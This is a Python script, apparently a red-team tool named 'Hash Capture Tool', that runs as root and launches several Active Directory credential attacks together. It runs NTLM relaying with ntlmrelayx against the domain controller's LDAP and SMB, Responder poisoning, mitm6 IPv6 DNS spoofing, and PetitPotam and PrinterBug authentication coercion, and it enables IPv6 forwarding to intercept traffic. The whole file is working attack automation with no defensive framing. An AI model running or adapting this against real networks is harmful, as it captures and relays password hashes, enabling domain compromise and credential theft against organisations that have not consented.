#!/usr/bin/env python3

import os
import sys
import time
import signal
import logging
import argparse
import netifaces
import ipaddress
import subprocess
import shutil
import socket
from pathlib import Path
from subprocess import Popen, PIPE, STDOUT
from threading import Thread, Event
import json
import re
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('hash_capture.log')
    ]
)

class HashCapture:
    def __init__(self, interface, domain=None, verbose=True):
        self.interface = interface
        self.domain = domain
        self.verbose = verbose
        self.stop_event = Event()
        self.processes = {}
        self.attack_threads = []
        self.local_ip = self.get_local_ip()
        self.original_ipv6_forward = None
        self.dc_ip = None

        # Get the global logger instance
        self.logger = logging.getLogger(__name__)
        
        # Set up attack loggers
        self.attack_loggers = {
            "ntlmrelay": logging.getLogger("ntlmrelay"),
            "responder": logging.getLogger("responder"),
            "mitm6": logging.getLogger("mitm6"),
            "petitpotam": logging.getLogger("petitpotam"),
            "printerbug": logging.getLogger("printerbug")
        }

        # Configure attack loggers
        for name, logger in self.attack_loggers.items():
            logger.setLevel(logging.DEBUG if verbose else logging.INFO)
            # Add console handler
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logger.addHandler(console_handler)
            # Add file handler
            file_handler = logging.FileHandler(f'{name}_attack.log')
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            logger.addHandler(file_handler)

        # Configure signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def check_dns_port(self):
        """Check if port 53 is available"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('', 53))
            sock.close()
            return True
        except socket.error as e:
            self.logger.error(f"Port 53 is already in use: {e}")
            try:
                output = subprocess.check_output("netstat -tulpn | grep :53", shell=True).decode()
                self.logger.error(f"Process using port 53: {output.strip()}")
            except:
                pass
            return False

    def create_targets_file(self):
        """Create targets file for ntlmrelayx"""
        try:
            if not self.domain:
                self.logger.warning("No domain specified for targets file")
                return True

            self.dc_ip = self.get_dc_ip()
            if not self.dc_ip:
                self.logger.error(f"Could not resolve domain controller for {self.domain}")
                return False

            with open("targets.txt", "w") as f:
                f.write(f"ldaps://{self.dc_ip}\n")
                f.write(f"ldap://{self.dc_ip}\n")
                f.write(f"smb://{self.dc_ip}\n")
            
            self.logger.info("Created targets file successfully")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create targets file: {e}")
            return False

    def setup_ipv6_forwarding(self):
        """Setup IPv6 forwarding"""
        try:
            # Read original value
            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'r') as f:
                self.original_ipv6_forward = f.read().strip()
            
            # Enable forwarding
            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
                f.write('1')
            
            self.logger.info("IPv6 forwarding enabled")
            return True
        except Exception as e:
            self.logger.error(f"Failed to enable IPv6 forwarding: {e}")
            return False

    def restore_ipv6_forwarding(self):
        """Restore original IPv6 forwarding state"""
        if self.original_ipv6_forward is not None:
            try:
                with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
                    f.write(self.original_ipv6_forward)
                self.logger.info("IPv6 forwarding restored")
            except Exception as e:
                self.logger.error(f"Failed to restore IPv6 forwarding: {e}")

    def get_local_ip(self):
        """Get IP address for specified interface"""
        try:
            return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            self.logger.error(f"Failed to get IP for interface {self.interface}: {e}")
            return None

    def get_dc_ip(self):
        """Get domain controller IP address"""
        try:
            if self.domain:
                cmd = f"nslookup -type=SRV _ldap._tcp.dc._msdcs.{self.domain}"
                output = subprocess.check_output(cmd.split(), universal_newlines=True)
                dc_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', output)
                if dc_ips:
                    return dc_ips[0]
        except Exception as e:
            self.logger.error(f"Failed to get DC IP: {e}")
        return None

    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        self.logger.info("Shutting down...")
        self.stop_event.set()
        self.cleanup()

    def process_output(self, process, logger, name):
        """Helper function to process output from attack processes"""
        try:
            while True:
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break
                    continue
                line_str = line.strip()
                if line_str:
                    logger.info(f"{line_str}")
        except Exception as e:
            self.logger.error(f"Error processing output for {name}: {e}")

    def cleanup(self):
        """Clean up running processes and restore system state"""
        self.logger.info("Cleaning up processes")
        for name, process in self.processes.items():
            try:
                self.logger.info(f"Terminating {name}")
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.logger.warning(f"Force killing {name}")
                    process.kill()
                    process.wait()
            except Exception as e:
                self.logger.error(f"Error cleaning up {name}: {e}")

        # Restore IPv6 forwarding
        self.restore_ipv6_forwarding()

    def start_ntlmrelay(self):
        """Start NTLM relay attack"""
        try:
            cmd = [
                "ntlmrelayx.py",
                "-tf", "targets.txt",
                "-smb2support",
                "-debug"
            ]
            
            if self.domain:
                cmd.extend([
                    "--no-http-server",
                    "--no-wcf",
                    "--no-raw",
                    "-wh", self.local_ip
                ])
            
            self.logger.info(f"Starting NTLM relay with command: {' '.join(cmd)}")
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            self.processes["ntlmrelay"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["ntlmrelay"], "NTLM Relay")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_ntlmrelay: {e}")
            return False

    def start_responder(self):
        """Start Responder attack"""
        try:
            cmd = [
                "responder",
                "-I", self.interface,
                "-wd"  # Combined flags for WinPopup and DHCP
            ]

            self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            self.processes["responder"] = process

            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["responder"], "Responder")
            )
            output_thread.daemon = True
            output_thread.start()

            return True
        except Exception as e:
            self.logger.error(f"Error in start_responder: {e}")
            return False

    def start_mitm6(self):
        """Start mitm6 attack"""
        try:
            if not self.check_dns_port():
                return False

            # Install required dependencies
            try:
                subprocess.check_call([
                    "pip", "install",
                    "--no-deps", "mitm6==0.2.2",
                    "--break-system-packages"
                ])
            except:
                self.logger.warning("Could not downgrade mitm6")

            cmd = [
                "mitm6",
                "-i", self.interface,
                "--debug"
            ]
            
            if self.domain:
                cmd.extend(["-d", self.domain])
            
            self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
            env = os.environ.copy()
            env["PYTHONIOENCODING"] = "latin1"
            env["PYTHONUNBUFFERED"] = "1"
            
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1,
                env=env
            )
            self.processes["mitm6"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["mitm6"], "MITM6")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_mitm6: {e}")
            return False

    def start_petitpotam(self):
        """Start PetitPotam attack"""
        try:
            if not self.domain or not self.dc_ip:
                self.logger.warning("PetitPotam attack requires a valid domain")
                return False

            cmd = [
                "petitpotam.py",
                self.local_ip,     # Listener
                self.dc_ip,        # Target
                "-pipe", "lsarpc",
                "-no-pass"
            ]
            
            self.logger.info(f"Starting PetitPotam with command: {' '.join(cmd)}")
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            self.processes["petitpotam"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["petitpotam"], "PetitPotam")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_petitpotam: {e}")
            return False

    def start_printerbug(self):
        """Start PrinterBug attack"""
        try:
            if not self.domain or not self.dc_ip:
                self.logger.warning("PrinterBug attack requires a valid domain")
                return False

            cmd = [
                "printerbug.py",
                f"{self.domain}/anonymous@{self.dc_ip}",
                self.local_ip,
                "-no-pass"
            ]
            
            self.logger.info(f"Starting PrinterBug with command: {' '.join(cmd)}")
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            self.processes["printerbug"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["printerbug"], "PrinterBug")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_printerbug: {e}")
            return False

    def run(self):
        """Main execution flow running all attacks simultaneously"""
        self.logger.info("Starting Hash Capture Operation")
        
        # Create targets file if domain is specified
        if not self.create_targets_file():
            self.logger.error("Failed to create targets file")
            return False

        # Setup IPv6 forwarding
        if not self.setup_ipv6_forwarding():
            self.logger.error("Failed to setup IPv6 forwarding")
            return False

        try:
            # List of attacks to run
            attacks = [
                ("NTLM Relay", self.start_ntlmrelay),
                ("Responder", self.start_responder),
                ("MITM6", self.start_mitm6),
                ("PetitPotam", self.start_petitpotam),
                ("PrinterBug", self.start_printerbug)
            ]

            # Start each attack in its own thread
            for attack_name, attack_func in attacks:
                try:
                    self.logger.info(f"Launching {attack_name} attack...")
                    thread = Thread(target=attack_func)
                    thread.daemon = True
                    thread.start()
                    self.attack_threads.append(thread)
                    time.sleep(1)  # Small delay between starting attacks
                    self.logger.info(f"{attack_name} attack thread started successfully")
                except Exception as e:
                    self.logger.error(f"Failed to start {attack_name} attack: {e}")

            self.logger.info("All attacks initiated. Press Ctrl+C to stop...")

            # Keep the main thread alive
            while not self.stop_event.is_set():
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.logger.info("Operation interrupted by user")
        except Exception as e:
            self.logger.error(f"Error in main execution: {e}")
        finally:
            self.cleanup()
        
        return True

def main():
    parser = argparse.ArgumentParser(description="Hash Capture Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-d", "--domain", help="Domain name for attacks")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    if os.geteuid() != 0:
        logging.error("This script must be run as root")
        sys.exit(1)

    capture = HashCapture(args.interface, args.domain, args.verbose)
    if not capture.run():
        sys.exit(1)

if __name__ == "__main__":
    main()
